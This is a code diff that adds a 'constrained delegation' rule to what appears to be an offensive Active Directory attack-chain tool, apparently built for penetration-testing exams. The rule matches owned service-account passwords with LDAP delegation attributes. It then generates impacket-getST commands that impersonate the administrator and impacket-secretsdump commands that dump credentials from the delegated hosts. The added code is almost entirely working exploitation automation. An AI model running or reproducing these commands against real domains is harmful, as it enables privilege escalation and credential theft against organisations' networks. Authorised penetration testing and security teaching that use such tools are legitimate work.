@@ -623,6 +623,44 @@ def run(report, store, ui=None):
                 ], src=hsrc, line=hln))
             break
 
+    # iter-47: R-CONSTRAINED - owned service account has msDS-AllowedToDelegateTo
+    # for a target SPN. Use S4U2self+S4U2proxy to impersonate Administrator
+    # to those services. Exam-legal (no relay, no admin gate).
+    delegators = {}  # user_lc -> list of target SPNs
+    for ev in store.items:
+        if ev.kind != "ldap_attr":
+            continue
+        atd = (ev.meta or {}).get("allowed_to_delegate")
+        if atd and ev.user:
+            delegators[ev.user.lower()] = atd
+    if delegators:
+        seen_c = set()
+        for (ulc, pw), occurrences in e.creds.items():
+            if ulc not in delegators or ulc in seen_c:
+                continue
+            seen_c.add(ulc)
+            spns = delegators[ulc]
+            best_src, best_line = "", None
+            for _d, _s, _l in occurrences:
+                if _s:
+                    best_src, best_line = _s, _l
+                    break
+            _dom_c = store.dominant_domain() or "<dom>"
+            # First target SPN for the sample command
+            first_spn = spns[0] if spns else "cifs/<target>.<dom>"
+            chains.append(Chain("R-CONSTRAINED", "constrained delegation",
+                f"{ulc} has AllowedToDelegateTo {spns[:3]}"
+                f"{'...' if len(spns) > 3 else ''}",
+                crit=8, conf=0.9, ready=1.4, prox=0.95,           # score 9.58
+                commands=[
+                    f"# {ulc} is trusted to delegate to {len(spns)} SPN(s)",
+                    f"impacket-getST -spn '{first_spn}' -impersonate administrator "
+                    f"'{_dom_c}/{ulc}:{pw}'",
+                    f"export KRB5CCNAME=administrator.ccache",
+                    f"impacket-secretsdump -k -no-pass "
+                    f"'{_dom_c}/administrator@{first_spn.split('/', 1)[-1]}'",
+                ], src=best_src, line=best_line))
+
     # iter-45: R-ADMIN-CRED - the operator's owned plaintext cred matches
     # a user BloodHound flagged 'admincount' (Domain Admin candidate).
     # Emit BEFORE R-GOLDEN so the operator sees the trivial win first:
